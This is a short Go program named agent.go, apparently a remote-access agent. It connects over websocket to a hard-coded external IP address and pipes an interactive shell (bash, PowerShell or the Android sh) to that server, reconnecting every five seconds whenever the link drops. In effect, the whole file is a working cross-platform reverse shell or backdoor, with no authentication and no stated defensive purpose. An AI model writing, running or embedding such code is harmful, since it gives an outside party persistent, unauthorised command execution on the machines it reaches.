// agent.go
package main

import (
	"context"
	"fmt"
	"io"
	"net/url"
	"os/exec"
	"runtime"
	"time"

	log "github.com/sirupsen/logrus"
	"golang.org/x/net/websocket"

	"github.com/creack/pty"
)

func connectAndServe() {
	for {
		u := url.URL{
			Scheme:   "ws",
			Host:     "121.40.42.38:6866",
			Path:     "/agent/ws",
			RawQuery: fmt.Sprintf("nodeId=%d", time.Now().UnixNano()),
		}

		log.Info("Connecting to", u.String())

		ws, err := websocket.Dial(u.String(), "", "http://121.40.42.38:6866/")
		if err != nil {
			log.Error("Retrying in 5s...", err)
			time.Sleep(5 * time.Second)
			continue
		}

		log.Info("Connected to server")

		switch runtime.GOOS {
		case "windows":
			runWindowsShell(ws)
		case "darwin", "linux":
			runUnixShell(ws)
		case "android":
			runAndroidShell(ws)
		default:
			log.Error("Unsupported platform:", runtime.GOOS)
			return
		}
		ws.Close()
		log.Error("Connection closed, retrying in 5s...")
		time.Sleep(5 * time.Second)
	}
}

func runUnixShell(ws *websocket.Conn) {
	cmd := exec.Command("bash")
	ptyFile, err := pty.Start(cmd)
	if err != nil {
		log.Error("PTY error:", err)
		return
	}

	errChan := make(chan error)
	go func() {
		_, err := io.Copy(ptyFile, ws)
		errChan <- err
	}()
	go func() {
		_, err := io.Copy(ws, ptyFile)
		errChan <- err
	}()

	log.Errorf("run command error: %v", <-errChan)

	_ = cmd.Process.Kill()
}

func runWindowsShell(ws *websocket.Conn) {

	ctx := context.Background()

	cmd := exec.CommandContext(ctx, "powershell.exe")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Error("StdinPipe error:", err)
		return
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Error("StdoutPipe error:", err)
		return
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Error("StderrPipe error:", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Error("Command start failed:", err)
		return
	}

	errChan := make(chan error, 3)

	go func() {
		_, err := io.Copy(stdin, ws)
		errChan <- fmt.Errorf("stdin copy error: %v", err)
	}()

	go func() {
		_, err := io.Copy(ws, stdout)
		errChan <- fmt.Errorf("stdout copy error: %v", err)
	}()

	go func() {
		_, err := io.Copy(ws, stderr)
		errChan <- fmt.Errorf("stderr copy error: %v", err)
	}()

	go func() {
		<-ctx.Done()
		cmd.Process.Kill()
		cmd.Wait()
	}()

	log.Error("run command error:", <-errChan)

	cmd.Process.Kill()
	cmd.Wait()

}

func runAndroidShell(ws *websocket.Conn) {
	cmd := exec.Command("/system/bin/sh")
	ptyFile, err := pty.Start(cmd)
	if err != nil {
		log.Error("PTY error:", err)
		return
	}

	errChan := make(chan error)
	go func() {
		_, err := io.Copy(ptyFile, ws)
		errChan <- err
	}()
	go func() {
		_, err := io.Copy(ws, ptyFile)
		errChan <- err
	}()

	log.Errorf("run command error: %v", <-errChan)

	_ = cmd.Process.Kill()
}

func main() {
	connectAndServe()
}
